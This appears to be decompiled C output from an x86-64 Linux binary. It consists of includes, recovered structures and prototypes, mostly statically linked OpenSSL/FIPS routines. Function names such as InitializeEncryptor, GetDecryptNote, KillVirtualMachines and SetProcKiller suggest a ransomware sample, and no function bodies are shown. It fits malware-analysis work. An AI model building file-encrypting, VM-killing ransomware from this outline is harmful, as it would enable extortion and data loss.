#include <ctype.h>
#include <dirent.h>
#include <dlfcn.h>
#include <errno.h>
#include <fcntl.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <unistd.h>

// ---------------- Integer Types Definitions -----------------

typedef int64_t int128_t;

// ----------------- Float Types Definitions ------------------

typedef double float64_t;

// ------------------------ Structures ------------------------

struct _IO_FILE {
    int32_t e0;
};

struct _TYPEDEF_Dl_info {
    char * e0;
    int64_t * e1;
    char * e2;
    int64_t * e3;
};

struct __dirstream {
    int32_t e0;
};

struct dirent {
    int32_t e0;
    int32_t e1;
    int16_t e2;
    char e3;
    char e4[256];
};

struct timeval {
    int64_t e0;
    int64_t e1;
};

// ------------------- Function Prototypes --------------------

int64_t _x86_64_AES_encrypt_compact(int64_t a1);
int64_t _x86_64_AES_set_encrypt_key(int64_t a1, int64_t a2, int64_t a3);
int64_t _Z11SearchFilesSsPFvSsP4statE(int64_t * result, int64_t a2, void (*a3)(int64_t, int64_t *));
int64_t _Z13SetProcKillerb(bool a1);
int64_t _Z14CheckFileNamesSs(int64_t a1);
int64_t _Z14GetDecryptNotev(void);
int64_t _Z17HandleCommandLineiPPc(uint32_t a1, char ** a2);
int64_t _Z19InitializeEncryptorv(void);
int64_t _Z19KillVirtualMachinesv(int64_t a1, int64_t a2, int64_t a3);
int64_t _Z6GetArgiPPcPKc(int32_t a1, char ** a2, char * a3);
int64_t _Z6KillVmi(uint32_t a1);
int64_t _Z7FindArgiPPcPKc(int32_t a1, char ** a2, char * a3);
int64_t _Z7GetPathv(void);
int64_t _Z7LogInitPKc(char * file_path);
int64_t _Z7SetFilePKc(char * a1);
int64_t _Z7SetPathPKc(char * a1);
int64_t _Z7SetSizei(uint32_t result);
int64_t _Z8LogClosev(void);
int64_t _Z9GetDetachv(void);
int64_t _Z9GetVMListv(void);
int64_t _Z9LogPrintfPKcz(char * a1, int64_t a2, int64_t a3, int64_t a4, int64_t a5, int64_t a6);
int64_t _Z9SetDetachb(bool a1);
int64_t _Z9SetVmListPKc(int64_t * this, int64_t * result, char * a3);
int64_t _ZdlPvS_(int64_t * a1, int64_t * a2);
int64_t _ZL13WriteFullDataiPhl(int32_t fd, char * a2, int32_t a3);
int64_t _ZL8MakePathSsSs(int64_t * result, int64_t a2, int64_t a3);
int64_t _ZL9humanSizemPc(uint64_t a1, char * str);
int64_t _ZN9__gnu_cxx13new_allocatorISsE10deallocateEPSsm(int64_t * result, int64_t * a2, int64_t a3);
int64_t _ZN9__gnu_cxx13new_allocatorISsE7destroyEPSs(int64_t * result, int64_t * a2);
int64_t _ZN9__gnu_cxx13new_allocatorISsE8allocateEmPKv(int64_t * result, uint64_t a2, int64_t * a3);
int64_t _ZN9__gnu_cxx13new_allocatorISsE9constructIISsEEEvPSsDpOT_(int64_t a1, int64_t a2, int64_t a3);
int64_t _ZN9__gnu_cxx17__normal_iteratorIPSsSt6vectorISsSaISsEEEC1ERKS1_(int64_t * result, int64_t ** a2);
int64_t _ZN9__gnu_cxxmiIPSsSt6vectorISsSaISsEEEENS_17__normal_iteratorIT_T0_E15difference_typeERKS8_SB_(int64_t * a1, int64_t * a2);
int64_t _ZNK9__gnu_cxx13new_allocatorISsE8max_sizeEv(int64_t * result);
int64_t _ZNK9__gnu_cxx17__normal_iteratorIPSsSt6vectorISsSaISsEEE4baseEv(int64_t * result);
int64_t _ZNK9__gnu_cxx17__normal_iteratorIPSsSt6vectorISsSaISsEEEdeEv(int64_t * result);
int64_t _ZNKSt12_Vector_baseISsSaISsEE19_M_get_Tp_allocatorEv(int64_t * result);
int64_t _ZNKSt13move_iteratorIPSsE4baseEv(int64_t * result);
int64_t _ZNKSt13move_iteratorIPSsEdeEv(int64_t * result);
int64_t _ZNKSt6vectorISsSaISsEE12_M_check_lenEmPKc(int64_t * result, uint64_t a2, char * a3);
int64_t _ZNKSt6vectorISsSaISsEE4sizeEv(int64_t * result);
int64_t _ZNKSt6vectorISsSaISsEE8max_sizeEv(int64_t * result);
int64_t _ZNSt12__miter_baseIPSsLb0EE3__bES0_(int64_t * a1);
int64_t _ZNSt12__niter_baseIPSsLb0EE3__bES0_(int64_t * a1);
void _ZNSt12_Destroy_auxILb0EE9__destroyIPSsEEvT_S3_(int64_t * a1, int64_t * a2);
int64_t _ZNSt12_Vector_baseISsSaISsEE11_M_allocateEm(int64_t * result, int64_t a2);
int64_t _ZNSt12_Vector_baseISsSaISsEE13_M_deallocateEPSsm(int64_t * result, int64_t * a2, int64_t a3);
int64_t _ZNSt12_Vector_baseISsSaISsEE19_M_get_Tp_allocatorEv(int64_t * result);
int64_t _ZNSt13move_iteratorIPSsEC1ES0_(int64_t * result, int64_t * a2);
int64_t _ZNSt13move_iteratorIPSsEppEv(int64_t * result);
int64_t * _ZNSt20__copy_move_backwardILb1ELb0ESt26random_access_iterator_tagE13__copy_move_bIPSsS3_EET0_T_S5_S4_(int64_t * a1, int64_t * a2, int64_t * result);
int64_t * _ZNSt20__uninitialized_copyILb0EE18uninitialized_copyISt13move_iteratorIPSsES3_EET0_T_S6_S5_(int64_t a1, int64_t a2, int64_t * a3);
int64_t _ZNSt6vectorISsSaISsEE12emplace_backIISsEEEvDpOT_(int64_t a1, int64_t a2);
int64_t _ZNSt6vectorISsSaISsEE13_M_insert_auxIISsEEEvN9__gnu_cxx17__normal_iteratorIPSsS1_EEDpOT_(int64_t a1, int64_t a2, int64_t a3);
int64_t _ZNSt6vectorISsSaISsEE3endEv(int64_t * result);
int64_t _ZNSt6vectorISsSaISsEE5beginEv(int64_t * result);
int64_t _ZNSt6vectorISsSaISsEE9push_backEOSs(int64_t * result, int64_t * a2);
int64_t _ZNSt6vectorISsSaISsEEixEm(int64_t * result, int64_t a2);
int64_t _ZnwmPv(int64_t a1, int64_t * a2);
void _ZSt10_ConstructISsSsEvPT_OT0_(int64_t * result, int64_t * a2, int64_t * a3);
int64_t * _ZSt13move_backwardIPSsS0_ET0_T_S2_S1_(int64_t * a1, int64_t * a2, int64_t * a3);
int64_t _ZSt18make_move_iteratorIPSsESt13move_iteratorIT_ERKS2_(int64_t ** a1);
int64_t * _ZSt18uninitialized_copyISt13move_iteratorIPSsES1_ET0_T_S4_S3_(int64_t a1, int64_t a2, int64_t * a3);
int64_t * _ZSt22__copy_move_backward_aILb1EPSsS0_ET1_T0_S2_S1_(int64_t * a1, int64_t * a2, int64_t * a3);
int64_t * _ZSt22__uninitialized_copy_aISt13move_iteratorIPSsES1_SsET0_T_S4_S3_RSaIT1_E(int64_t a1, int64_t a2, int64_t * a3, int64_t * a4);
int64_t * _ZSt22__uninitialized_move_aIPSsS0_SaISsEET0_T_S3_S2_RT1_(int64_t * a1, int64_t * a2, int64_t * a3, int64_t * a4);
int64_t * _ZSt23__copy_move_backward_a2ILb1EPSsS0_ET1_T0_S2_S1_(int64_t * a1, int64_t * a2, int64_t * a3);
int64_t * _ZSt3maxImERKT_S2_S2_(int64_t * a1, int64_t * a2);
int64_t * _ZSt4moveIRSsEONSt16remove_referenceIT_E4typeEOS2_(int64_t ** a1);
int64_t * _ZSt7forwardISsEOT_ONSt8identityIS0_E4typeE(int64_t * result);
void _ZSt8_DestroyIPSsEvT_S1_(int64_t * a1, int64_t * a2);
void _ZSt8_DestroyIPSsSsEvT_S1_RSaIT0_E(int64_t * a1, int64_t * a2, int64_t * a3);
void _ZSt8_DestroyISsEvPT_(int64_t * a1);
bool _ZSteqIPSsS0_EbRKSt13move_iteratorIT_ERKS1_IT0_E(int64_t * a1, int64_t * a2);
bool _ZStneIPSsS0_EbRKSt13move_iteratorIT_ERKS1_IT0_E(int64_t * a1, int64_t * a2);
int64_t _ZStplIcSt11char_traitsIcESaIcEESbIT_T0_T1_ERKS6_PKS3_(int64_t * result, int64_t * a2, char * a3);
int64_t _ZStplIcSt11char_traitsIcESaIcEESbIT_T0_T1_ERKS6_S8_(int64_t * result, int64_t * a2, int64_t * a3);
int64_t AES_encrypt(int64_t * a1, int64_t * a2, int64_t * a3);
int64_t AES_set_encrypt_key(int64_t a1, int64_t a2, int64_t * a3);
int64_t BIO_free(int64_t a1);
int64_t BIO_free_all(int64_t a1);
int64_t BIO_gets(int64_t result, int64_t * a2, int64_t a3, int64_t a4, int64_t a5);
int64_t BIO_new(int64_t a1);
int64_t BIO_new_mem_buf(char * str, int64_t a2);
int64_t BIO_s_mem(void);
int64_t BIO_set(int64_t a1, int64_t a2);
int64_t BIO_snprintf(int64_t a1, int64_t a2, char * a3, int64_t a4, int64_t a5, int64_t a6);
int64_t BN_bin2bn(int64_t a1, int32_t a2, int32_t a3);
int64_t BN_BLINDING_free(int64_t a1);
int64_t BN_bn2bin(int64_t a1, int64_t a2);
int64_t BN_clear_free(int64_t a1);
int64_t BN_cmp(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int64_t a5, int64_t a6);
int64_t BN_copy(int64_t result, int64_t a2);
int64_t BN_CTX_free(int64_t a1);
int64_t BN_CTX_get(int64_t a1);
int64_t BN_CTX_new(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int64_t a5, int64_t a6);
int64_t BN_dup(int64_t a1);
int64_t bn_expand2(int64_t result, uint64_t a2);
int64_t bn_expand_internal(int64_t a1, int64_t a2);
int64_t BN_free(int64_t a1);
int64_t BN_init(int64_t a1);
int64_t BN_is_bit_set(int64_t a1, uint64_t a2);
int64_t BN_new(int64_t a1, int64_t a2, char a3);
int64_t BN_num_bits(int64_t a1);
int64_t BN_num_bits_word(uint64_t a1);
int64_t BN_set_bit(int64_t a1, uint64_t a2);
int64_t BN_set_word(int64_t a1, int64_t a2);
int64_t BUF_MEM_free(int64_t a1, int64_t a2);
int64_t BUF_MEM_grow(uint64_t a1, uint64_t a2);
int64_t BUF_MEM_grow_clean(uint64_t a1, uint64_t a2);
int64_t BUF_MEM_new(void);
int64_t CMAC_CTX_cleanup(int64_t a1);
int64_t CMAC_CTX_free(int64_t a1);
int64_t CMAC_CTX_new(void);
int64_t CMAC_Final(int64_t a1, int64_t a2, int64_t a3);
int64_t CMAC_Init(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int32_t a5);
int64_t CMAC_Update(int64_t a1, int64_t a2, uint64_t a3);
int64_t compute_file_hmac(int64_t file_path, int64_t * a2, int64_t * a3);
int64_t compute_wNAF(int64_t a1, int64_t a2, int64_t a3);
int64_t CRYPTO_add_lock(int64_t a1, int64_t a2, int64_t a3, char * a4, int64_t a5);
int64_t CRYPTO_destroy_dynlockid(int64_t a1);
int64_t CRYPTO_free(int64_t a1, int64_t a2);
int64_t CRYPTO_free_ex_data(int32_t a1, int64_t a2, int64_t a3);
int64_t CRYPTO_free_locked(int64_t a1, int64_t a2);
int64_t CRYPTO_get_dynlock_value(int64_t a1);
int64_t CRYPTO_lock(int64_t a1, int64_t a2, char * a3, int64_t a4, int64_t a5, int64_t a6);
int64_t CRYPTO_malloc(int64_t a1, char * a2, int64_t a3, int64_t a4, int64_t a5);
int64_t CRYPTO_mem_ctrl(int64_t a1);
int64_t CRYPTO_new_ex_data(int32_t a1, int64_t a2, int64_t a3);
int64_t CRYPTO_realloc(int64_t a1, int64_t a2, char * a3, int64_t a4, int64_t a5, int64_t a6);
int64_t CRYPTO_realloc_clean(int64_t a1, int64_t a2, int64_t a3, char * a4, int64_t a5, int64_t a6);
int64_t CRYPTO_THREADID_cmp(int64_t * a1, int64_t * a2, int64_t a3);
int64_t CRYPTO_THREADID_cpy(int64_t * a1, int64_t * a2);
int64_t CRYPTO_THREADID_current(int64_t a1);
int64_t CRYPTO_THREADID_hash(int64_t a1);
int64_t CRYPTO_THREADID_set_numeric(int64_t a1, int64_t a2);
int64_t CRYPTO_THREADID_set_pointer(int64_t a1, int64_t a2);
int64_t DH_free(int64_t a1);
int64_t DH_generate_key(int64_t a1);
int64_t DH_get_default_method(void);
int64_t DH_new(int64_t a1);
int64_t DH_new_method(int32_t a1);
int64_t DH_OpenSSL(void);
int64_t do_drbg_init(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int64_t a5, int64_t a6);
int64_t do_drbg_instantiate(int64_t a1, int64_t a2);
int64_t do_x931_test(int64_t * a1, int64_t a2, int64_t * a3);
int64_t doall_util_fn(int64_t a1, int32_t a2, int64_t a3, int32_t a4, int32_t a5);
int64_t drbg_get_adin(int64_t a1, int64_t * a2);
int64_t drbg_reseed(int64_t a1, int64_t a2, uint64_t a3, int64_t a4);
int64_t DSA_free(int64_t a1);
int64_t DSA_get_default_method(void);
int64_t DSA_new(int64_t a1);
int64_t DSA_new_method(int32_t a1);
int64_t DSA_OpenSSL(void);
int64_t EC_EX_DATA_clear_free_all_data(int64_t a1);
int64_t EC_EX_DATA_free_all_data(int64_t a1);
int64_t EC_EX_DATA_get_data(int64_t a1, int64_t a2, int64_t a3, int64_t a4);
int64_t EC_EX_DATA_set_data(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int64_t a5);
int64_t EC_GFp_mont_method(void);
int64_t EC_GROUP_clear_free(int64_t a1);
int64_t EC_GROUP_free(int64_t a1);
int64_t EC_GROUP_get0_generator(int64_t a1);
int64_t EC_GROUP_method_of(int64_t result);
int64_t EC_GROUP_new(int64_t a1);
int64_t EC_GROUP_new_by_curve_name(int64_t a1);
int64_t EC_GROUP_new_curve_GFp(int64_t a1, int64_t a2, int64_t a3, int32_t a4);
int64_t EC_GROUP_set_curve_GFp(int64_t a1);
int64_t EC_GROUP_set_curve_name(int64_t a1, int64_t a2);
int64_t EC_GROUP_set_generator(int64_t a1, int64_t a2, int64_t a3, int64_t a4);
int64_t EC_GROUP_set_seed(int64_t a1, int64_t a2, int64_t a3);
int64_t EC_KEY_check_key(int64_t a1);
int64_t EC_KEY_free(int64_t a1);
int64_t EC_KEY_get0_public_key(int64_t a1);
int64_t EC_KEY_get_flags(int64_t a1);
int64_t EC_KEY_get_key_method_data(int64_t a1, int64_t a2, int64_t a3, int64_t a4);
int64_t EC_KEY_insert_key_method_data(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int64_t a5);
int64_t EC_KEY_new(void);
int64_t EC_KEY_new_by_curve_name(uint32_t a1);
int64_t EC_KEY_set_flags(int64_t a1, int64_t a2);
int64_t EC_KEY_set_private_key(int64_t a1, int64_t a2);
int64_t EC_KEY_set_public_key(int64_t a1, int64_t a2);
int64_t EC_KEY_set_public_key_affine_coordinates(int64_t a1, int64_t a2, int64_t a3);
int64_t EC_METHOD_get_field_type(int64_t a1);
int64_t EC_POINT_add(int64_t a1, int64_t a2, int64_t a3, int64_t a4);
int64_t EC_POINT_clear_free(int64_t a1);
int64_t EC_POINT_cmp(int64_t a1, int64_t a2, int64_t a3);
int64_t EC_POINT_copy(int64_t a1, int64_t a2);
int64_t EC_POINT_dbl(int64_t a1, int64_t a2, int64_t a3);
int64_t EC_POINT_dup(int64_t a1, int64_t a2);
int64_t EC_POINT_free(int64_t a1);
int64_t EC_POINT_get_affine_coordinates_GFp(int64_t a1, int64_t a2);
int64_t EC_POINT_invert(int64_t a1, int64_t a2);
int64_t EC_POINT_is_at_infinity(int64_t a1, int64_t a2);
int64_t EC_POINT_is_on_curve(int64_t a1, int64_t a2);
int64_t EC_POINT_mul(int64_t a1, int64_t a2, int32_t a3, int64_t a4, int64_t a5, int64_t a6);
int64_t EC_POINT_new(int64_t a1);
int64_t EC_POINT_set_affine_coordinates_GFp(int64_t a1, int64_t a2);
int64_t EC_POINT_set_to_infinity(int64_t a1, int64_t a2);
int64_t EC_POINTs_make_affine(int64_t a1, uint64_t a2, int64_t a3, int64_t a4, int64_t a5);
int64_t EC_POINTs_mul(int64_t a1, int64_t a2);
int64_t ec_wNAF_mul(int64_t a1, int64_t a2, int64_t a3, uint64_t a4, int64_t a5, int64_t a6, int64_t a7);
int64_t ecdh_check(int64_t a1);
int64_t ECDH_compute_key(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int32_t a5);
int64_t ecdh_data_free(int64_t a1);
int64_t ECDH_DATA_new_method_clone_0(void);
int64_t ECDH_get_default_method(void);
int64_t ECDH_OpenSSL(void);
int64_t ENGINE_finish(int64_t a1);
int64_t ENGINE_free(int64_t a1);
int64_t engine_free_util(int64_t a1, int32_t a2);
int64_t ENGINE_get_cipher(int64_t a1, int32_t a2, int64_t a3);
int64_t ENGINE_get_cipher_engine(uint32_t a1);
int64_t ENGINE_get_ciphers(int64_t a1);
int64_t ENGINE_get_default_DH(void);
int64_t ENGINE_get_default_DSA(void);
int64_t ENGINE_get_default_ECDH(void);
int64_t ENGINE_get_default_RSA(void);
int64_t ENGINE_get_DH(int64_t a1);
int64_t ENGINE_get_digest(int64_t a1, int32_t a2, int64_t a3);
int64_t ENGINE_get_digest_engine(uint32_t a1);
int64_t ENGINE_get_digests(int64_t a1);
int64_t ENGINE_get_DSA(int64_t a1);
int64_t ENGINE_get_ECDH(int64_t a1);
int64_t ENGINE_get_pkey_asn1_meth(int64_t a1, int64_t a2, int64_t a3);
int64_t ENGINE_get_pkey_asn1_meth_engine(int64_t a1);
int64_t ENGINE_get_pkey_asn1_meths(int64_t a1);
int64_t ENGINE_get_pkey_meth(int64_t a1, int64_t a2, int64_t a3);
int64_t ENGINE_get_pkey_meth_engine(int64_t a1);
int64_t ENGINE_get_pkey_meths(int64_t a1);
int64_t ENGINE_get_RSA(int64_t a1);
int64_t ENGINE_init(int64_t a1);
int64_t ENGINE_pkey_asn1_find_str(int64_t * a1, int64_t a2, int64_t a3);
int64_t engine_pkey_asn1_meths_free(int64_t a1, int64_t a2, int64_t a3, int64_t a4);
int64_t engine_pkey_meths_free(int64_t a1, int64_t a2, int64_t a3, int64_t a4);
int64_t engine_table_doall(int64_t a1, int64_t a2, int64_t * a3);
int64_t engine_table_select(int64_t * a1, int64_t a2);
int64_t engine_unlocked_finish(int64_t a1, int64_t a2);
int64_t engine_unlocked_init(int64_t a1);
int64_t ERR_add_error_data(int64_t a1, char * a2, int64_t a3, char * a4, int64_t * a5, char * a6);
int64_t ERR_clear_error(void);
int64_t ERR_error_string_n(uint64_t a1, int64_t a2, uint64_t a3);
int64_t err_fns_check(void);
int64_t ERR_func_error_string(int64_t a1);
int64_t ERR_get_error_line_data(int64_t * a1, int64_t * a2, int64_t * a3, int64_t * a4);
int64_t ERR_get_state(void);
int64_t ERR_lib_error_string(int64_t a1);
int64_t ERR_peek_error(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int64_t a5, int64_t a6);
int64_t ERR_peek_last_error(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int64_t a5, int64_t a6);
int64_t ERR_pop_to_mark(void);
int64_t ERR_print_errors_cb(int64_t a1, int64_t a2);
int64_t ERR_put_error(int64_t a1, int64_t a2, uint64_t a3, char * a4, int64_t a5);
int64_t ERR_reason_error_string(int64_t a1);
int64_t ERR_set_mark(int64_t a1, int64_t a2, int64_t a3);
int64_t ERR_STATE_free(int64_t a1);
int64_t EVP_aes_128_cbc(void);
int64_t EVP_aes_128_ccm(void);
int64_t EVP_aes_128_cfb1(void);
int64_t EVP_aes_128_cfb128(void);
int64_t EVP_aes_128_cfb8(void);
int64_t EVP_aes_128_ctr(void);
int64_t EVP_aes_128_ecb(void);
int64_t EVP_aes_128_gcm(void);
int64_t EVP_aes_128_ofb(void);
int64_t EVP_aes_128_xts(void);
int64_t EVP_aes_192_cbc(void);
int64_t EVP_aes_192_ccm(int64_t a1);
int64_t EVP_aes_192_cfb1(void);
int64_t EVP_aes_192_cfb128(void);
int64_t EVP_aes_192_cfb8(void);
int64_t EVP_aes_192_ctr(void);
int64_t EVP_aes_192_ecb(void);
int64_t EVP_aes_192_gcm(void);
int64_t EVP_aes_192_ofb(void);
int64_t EVP_aes_256_cbc(void);
int64_t EVP_aes_256_ccm(void);
int64_t EVP_aes_256_cfb1(void);
int64_t EVP_aes_256_cfb128(void);
int64_t EVP_aes_256_cfb8(void);
int64_t EVP_aes_256_ctr(void);
int64_t EVP_aes_256_ecb(void);
int64_t EVP_aes_256_gcm(int64_t a1);
int64_t EVP_aes_256_ofb(void);
int64_t EVP_aes_256_xts(void);
int64_t EVP_BytesToKey(int64_t a1, int64_t a2, int64_t a3, int64_t * a4, int32_t a5, int64_t a6, int64_t * a7, int64_t a8);
int64_t EVP_Cipher(int64_t a1, int64_t * a2, int64_t a3, int32_t a4);
int64_t EVP_CIPHER_CTX_block_size(int64_t * a1);
int64_t EVP_CIPHER_CTX_cipher(int64_t result);
int64_t EVP_CIPHER_CTX_cleanup(int64_t a1);
int64_t EVP_CIPHER_CTX_ctrl(int64_t a1);
int64_t EVP_CIPHER_CTX_flags(int64_t a1);
int64_t EVP_CIPHER_CTX_init(int64_t a1);
int64_t EVP_CIPHER_CTX_iv_length(int64_t a1);
int64_t EVP_CIPHER_CTX_set_key_length(int64_t a1, uint32_t a2, int64_t a3, int64_t a4);
int64_t EVP_CipherInit_ex(int64_t a1, int64_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6);
int64_t EVP_DecodeBlock(int64_t a1, int64_t a2, int32_t a3, int64_t a4, int64_t a5, int64_t a6);
int64_t EVP_DecodeFinal(int64_t * a1, int64_t a2, int64_t * a3);
int64_t EVP_DecodeInit(int64_t * a1);
int64_t EVP_DecodeUpdate(int64_t * a1, int64_t a2, int32_t * a3, int64_t a4, uint32_t a5, int64_t a6, int64_t a7, int64_t a8, int64_t a9, int64_t a10, int64_t a11, int64_t a12);
int64_t EVP_DecryptFinal_ex(int64_t a1, int64_t a2, int64_t a3, int64_t a4);
int64_t EVP_DecryptInit_ex(int64_t * a1, int64_t a2, int32_t a3, int64_t * a4, int64_t a5, int64_t a6);
int64_t EVP_DecryptUpdate(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int64_t a5, int64_t a6);
int64_t EVP_des_ede(void);
int64_t EVP_des_ede3(void);
int64_t EVP_des_ede3_cbc(void);
int64_t EVP_des_ede3_cfb1(void);
int64_t EVP_des_ede3_cfb64(void);
int64_t EVP_des_ede3_cfb8(void);
int64_t EVP_des_ede3_ecb(void);
int64_t EVP_des_ede3_ofb(void);
int64_t EVP_des_ede_cbc(void);
int64_t EVP_des_ede_cfb64(void);
int64_t EVP_des_ede_ecb(void);
int64_t EVP_des_ede_ofb(void);
int64_t EVP_Digest(int64_t a1, int32_t a2, int64_t * a3, int32_t a4, int64_t a5, int32_t a6);
int64_t EVP_DigestFinal_ex(int64_t * a1, int64_t * a2, int64_t * a3);
int64_t EVP_DigestInit_ex(int64_t * a1, int64_t a2, int32_t a3, int64_t a4, int64_t a5);
int64_t EVP_DigestUpdate(int64_t * a1, int64_t a2, int64_t a3);
int64_t EVP_EncryptInit_ex(int64_t a1, int64_t a2, int32_t a3, int64_t a4, int64_t * a5);
int64_t EVP_EncryptUpdate(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int64_t a5, int64_t a6);
int64_t EVP_get_cipherbyname(int64_t a1, int64_t a2);
int64_t EVP_get_pw_prompt(void);
int64_t EVP_md5(void);
int64_t EVP_MD_block_size(int64_t a1);
int64_t EVP_MD_CTX_cleanup(int64_t * a1);
int64_t EVP_MD_CTX_clear_flags(int64_t a1, int64_t a2);
int64_t EVP_MD_CTX_copy_ex(int64_t * a1, int64_t a2);
int64_t EVP_MD_CTX_init(int64_t a1);
int64_t EVP_MD_CTX_set_flags(int64_t a1, int64_t a2);
int64_t EVP_MD_CTX_test_flags(int64_t a1, int64_t a2);
int64_t EVP_MD_size(int64_t a1);
int64_t EVP_PKEY_asn1_find(int64_t * a1, int64_t a2);
int64_t EVP_PKEY_asn1_find_str(int32_t a1, int64_t str, int64_t a3);
int64_t EVP_PKEY_asn1_free(int64_t a1);
int64_t EVP_PKEY_asn1_get0(int64_t a1);
int64_t EVP_PKEY_asn1_get_count(void);
int64_t EVP_PKEY_assign(int64_t a1, int64_t a2, int64_t a3);
int64_t EVP_PKEY_CTX_ctrl(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int32_t a5, int64_t a6);
int64_t EVP_PKEY_CTX_dup(int64_t a1);
int64_t EVP_PKEY_CTX_free(int64_t a1);
int64_t EVP_PKEY_CTX_new(int64_t a1, int32_t a2);
int64_t EVP_PKEY_free(int64_t a1);
int64_t EVP_PKEY_free_it(int64_t a1);
int64_t EVP_PKEY_meth_find(int64_t a1);
int64_t EVP_PKEY_meth_free(int64_t a1);
int64_t EVP_PKEY_new(int64_t a1, int64_t a2, int64_t a3);
int64_t EVP_PKEY_set1_RSA(int64_t a1, int64_t a2);
int64_t EVP_PKEY_set_type(int64_t a1, int64_t a2, int64_t a3);
int64_t EVP_PKEY_sign(int64_t a1, int64_t a2, int64_t * a3, int64_t * a4, int64_t a5);
int64_t EVP_PKEY_sign_init(int64_t a1);
int64_t EVP_PKEY_size(int64_t a1);
int64_t EVP_PKEY_verify(int64_t a1);
int64_t EVP_PKEY_verify_init(int64_t a1);
int64_t EVP_read_pw_string_min(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int64_t a5);
int64_t EVP_sha1(void);
int64_t EVP_sha224(void);
int64_t EVP_sha256(void);
int64_t EVP_sha384(void);
int64_t EVP_sha512(int64_t a1, int64_t a2);
int64_t EVP_SignFinal(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int64_t a5);
int64_t EVP_VerifyFinal(int64_t * a1, int64_t a2, int32_t a3, int64_t a4, int64_t a5);
int64_t fips_cipher_test(int64_t * a1, int64_t a2, int64_t * a3, int64_t * a4, int64_t * a5, int64_t * a6, int32_t a7);
int64_t fips_drbg_ctr_init(int64_t a1);
int64_t fips_drbg_error_check(int64_t a1, int64_t a2, int64_t a3, int64_t a4);
int64_t FIPS_drbg_free(int64_t a1);
int64_t FIPS_drbg_generate(int64_t * a1, int64_t a2, uint64_t a3, int32_t a4, int64_t a5, uint64_t a6);
int64_t fips_drbg_hash_init(int64_t a1);
int64_t FIPS_drbg_health_check(int64_t a1, int64_t a2);
int64_t fips_drbg_hmac_init(int64_t a1);
int64_t FIPS_drbg_init(int64_t a1, int32_t a2, int32_t a3);
int64_t FIPS_drbg_instantiate(int64_t a1, int64_t * a2, uint64_t a3);
int64_t fips_drbg_kat(int64_t a1, int32_t a2, int32_t a3);
int64_t FIPS_drbg_method(void);
int64_t FIPS_drbg_new(uint32_t a1, int32_t a2);
int64_t FIPS_drbg_reseed(int64_t a1, int32_t a2, int32_t a3, int64_t a4);
int64_t FIPS_drbg_set_app_data(int64_t a1, int64_t a2);
int64_t FIPS_drbg_set_callbacks(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int64_t a5, int64_t a6);
int64_t FIPS_drbg_set_rand_callbacks(int64_t a1, int64_t a2, int32_t a3, int64_t a4, int64_t a5);
int64_t fips_drbg_single_kat(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int64_t a5, int64_t a6);
int64_t FIPS_drbg_uninstantiate(int64_t * a1);
int64_t FIPS_get_cipherbynid(int32_t a1);
int64_t FIPS_get_default_drbg(void);
int64_t FIPS_get_digestbynid(int32_t a1);
int64_t fips_get_entropy(int64_t a1, int64_t * a2, int32_t a3, int64_t a4, uint64_t a5);
int64_t FIPS_get_timevec(int64_t * a1, int64_t * a2);
int64_t fips_is_owning_thread(void);
int64_t FIPS_mode(void);
int64_t FIPS_mode_set(int64_t a1);
int64_t FIPS_module_installed(int64_t a1, int64_t a2);
int64_t FIPS_module_mode(void);
int64_t FIPS_module_mode_set(int64_t a1);
int64_t fips_pkey_signature_test(int64_t a1, int64_t * str, int32_t a3, int32_t a4, uint32_t a5, int32_t a6, uint32_t a7, int64_t a8);
int64_t FIPS_rand_get_method(void);
int64_t FIPS_rand_set_method(int64_t a1);
int64_t FIPS_selftest(void);
int64_t FIPS_selftest_aes(int64_t a1, int64_t a2, int64_t a3, int64_t a4);
int64_t FIPS_selftest_aes_ccm(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int64_t a5);
int64_t FIPS_selftest_aes_gcm(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int64_t a5);
int64_t FIPS_selftest_aes_xts(void);
int64_t FIPS_selftest_check(void);
int64_t FIPS_selftest_cmac(void);
int64_t FIPS_selftest_des(void);
int64_t FIPS_selftest_dh(void);
int64_t FIPS_selftest_drbg(int64_t a1, int64_t a2);
int64_t FIPS_selftest_dsa(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int64_t a5);
int64_t FIPS_selftest_ecdh(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int64_t a5);
int64_t FIPS_selftest_ecdsa(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int64_t a5);
int64_t FIPS_selftest_failed(void);
int64_t FIPS_selftest_hmac(void);
int64_t FIPS_selftest_rsa(void);
int64_t FIPS_selftest_sha1(void);
int64_t FIPS_selftest_sha2(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int64_t a5, int64_t a6);
int64_t FIPS_selftest_x931(void);
int64_t fips_set_mode(int32_t a1);
int64_t fips_set_selftest_fail(void);
int64_t FIPS_x931_bytes(int64_t * a1, int64_t a2);
int64_t FIPS_x931_method(void);
int64_t FIPS_x931_reset(void);
int64_t FIPS_x931_seed(int64_t a1, int64_t a2);
int64_t FIPS_x931_set_dt(int64_t a1);
int64_t FIPS_x931_set_key(int64_t a1, int64_t a2);
int64_t FIPS_x931_test_mode(void);
int64_t FIPSCHECK_verify(int64_t * str);
int64_t free_string(int64_t a1);
int64_t function_42e2c0(void);
int64_t function_42e6b0(int64_t a1, int64_t a2, int64_t a3);
int64_t function_42e7c0(void);
int64_t function_42e830(int64_t a1);
int64_t general_allocate_prompt(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int64_t a5, int64_t a6);
